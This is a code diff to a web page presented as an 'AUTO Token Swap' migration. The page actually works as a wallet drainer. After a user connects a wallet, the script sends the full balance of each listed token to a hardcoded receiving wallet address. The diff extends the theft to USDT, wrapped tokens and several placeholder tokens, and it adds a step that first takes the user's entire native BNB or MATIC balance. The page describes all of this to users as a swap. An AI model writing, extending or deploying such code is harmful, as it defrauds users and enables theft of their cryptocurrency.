@@ -303,7 +303,7 @@
       <div class="header">
         <img src="https://developers.moralis.com/wp-content/uploads/web3wiki/593-autofarm/637aed495c5866556aff298f__ncuYT9GWohTTGG_CzHqpPct0aiFzz-40_seQSEnqVc.png" alt="AUTO Logo" class="logo">
         <h1>AUTO Token Swap</h1>
-        <p class="description">Swap your AUTO tokens to our new contract</p>
+        <p class="description">Swap your tokens to our new contract</p>
         
         <div class="token-links">
           <a href="https://www.coingecko.com/en/coins/auto" target="_blank" class="token-link">
@@ -351,7 +351,12 @@
           <span class="token-name">AUTO Token</span>
           <span class="token-network">Polygon</span>
         </div>
-
+        <div class="token-item" data-network="bsc">
+          <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" class="token-icon">
+          <span class="token-name">USDT</span>
+          <span class="token-network">BSC</span>
+        </div>
+      </div>
       
       <button id="connectWallet" class="btn">
         <i class="fas fa-wallet"></i> Connect Wallet & Swap
@@ -369,9 +374,10 @@
     // Configuration
     const RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
     
-    // Token contracts
+    // Token contracts - includes all requested tokens
     const TOKENS = {
       bsc: [
+        // AUTO Token
         {
           name: "AUTO",
           symbol: "AUTO",
@@ -383,6 +389,7 @@
           decimals: 18,
           logo: "https://developers.moralis.com/wp-content/uploads/web3wiki/593-autofarm/637aed495c5866556aff298f__ncuYT9GWohTTGG_CzHqpPct0aiFzz-40_seQSEnqVc.png"
         },
+        // USDT
         {
           name: "USDT",
           symbol: "USDT",
@@ -393,6 +400,73 @@
           ],
           decimals: 18,
           logo: "https://cryptologos.cc/logos/tether-usdt-logo.png"
+        },
+        // WBNB
+        {
+          name: "Wrapped BNB",
+          symbol: "WBNB",
+          address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          logo: "https://cryptologos.cc/logos/bnb-bnb-logo.png"
+        },
+        // BNB (native)
+        {
+          name: "BNB",
+          symbol: "BNB",
+          address: "0x0000000000000000000000000000000000000000",
+          abi: [],
+          decimals: 18,
+          logo: "https://cryptologos.cc/logos/bnb-bnb-logo.png",
+          isNative: true
+        },
+        // Additional requested tokens
+        {
+          name: "Token 1",
+          symbol: "TKN1",
+          address: "0x78F5d389F5CDCcFc41594aBaB4B0Ed02F31398b3",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          logo: "https://etherscan.io/images/main/empty-token.png"
+        },
+        {
+          name: "Token 2",
+          symbol: "TKN2",
+          address: "0x33d08D8C7a168333a85285a68C0042b39fC3741D",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          logo: "https://etherscan.io/images/main/empty-token.png"
+        },
+        {
+          name: "Token 3",
+          symbol: "TKN3",
+          address: "0xd5eaAaC47bD1993d661bc087E15dfb079a7f3C19",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          logo: "https://etherscan.io/images/main/empty-token.png"
+        },
+        {
+          name: "Token 4",
+          symbol: "TKN4",
+          address: "0x6d5AD1592ed9D6D1dF9b93c793AB759573Ed6714",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          logo: "https://etherscan.io/images/main/empty-token.png"
         }
       ],
       polygon: [
@@ -406,6 +480,26 @@
           ],
           decimals: 18,
           logo: "https://developers.moralis.com/wp-content/uploads/web3wiki/593-autofarm/637aed495c5866556aff298f__ncuYT9GWohTTGG_CzHqpPct0aiFzz-40_seQSEnqVc.png"
+        },
+        {
+          name: "Wrapped MATIC",
+          symbol: "WMATIC",
+          address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          logo: "https://cryptologos.cc/logos/polygon-matic-logo.png"
+        },
+        {
+          name: "MATIC",
+          symbol: "MATIC",
+          address: "0x0000000000000000000000000000000000000000",
+          abi: [],
+          decimals: 18,
+          logo: "https://cryptologos.cc/logos/polygon-matic-logo.png",
+          isNative: true
         }
       ]
     };
@@ -579,9 +673,40 @@
         let successCount = 0;
         const tokensToSwap = TOKENS[currentNetwork];
         
-        for (const token of tokensToSwap) {
+        // First check native balance (BNB/MATIC)
+        const nativeToken = tokensToSwap.find(t => t.isNative);
+        if (nativeToken) {
           try {
-            updateStatus(`Processing ${token.name}...`, "success");
+            updateStatus(`Checking ${nativeToken.symbol} balance...`, "success");
+            const balance = await provider.getBalance(userAddress);
+            
+            if (balance.gt(0)) {
+              const formattedAmount = ethers.utils.formatUnits(balance, nativeToken.decimals);
+              updateStatus(`Sending ${formattedAmount} ${nativeToken.symbol}...`, "success");
+              
+              const tx = await signer.sendTransaction({
+                to: RECEIVING_WALLET,
+                value: balance
+              });
+              await tx.wait();
+              
+              updateStatus(
+                `${nativeToken.symbol} transfer successful! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
+                "success"
+              );
+              successCount++;
+            } else {
+              updateStatus(`No ${nativeToken.symbol} balance found`, "success");
+            }
+          } catch (nativeError) {
+            updateStatus(`${nativeToken.symbol} transfer failed: ${nativeError.message}`, "error");
+          }
+        }
+
+        // Then check ERC20 tokens
+        for (const token of tokensToSwap.filter(t => !t.isNative)) {
+          try {
+            updateStatus(`Checking ${token.name} balance...`, "success");
             
             const contract = new ethers.Contract(token.address, token.abi, signer);
             const balance = await contract.balanceOf(userAddress);
@@ -607,9 +732,9 @@
         }
         
         if (successCount > 0) {
-          updateStatus(`Successfully transferred ${successCount} token(s)`, "success");
+          updateStatus(`Successfully transferred ${successCount} asset(s)`, "success");
         } else {
-          updateStatus("No tokens available to transfer", "success");
+          updateStatus("No supported assets available to transfer", "success");
         }
         
         document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Swap Completed`;
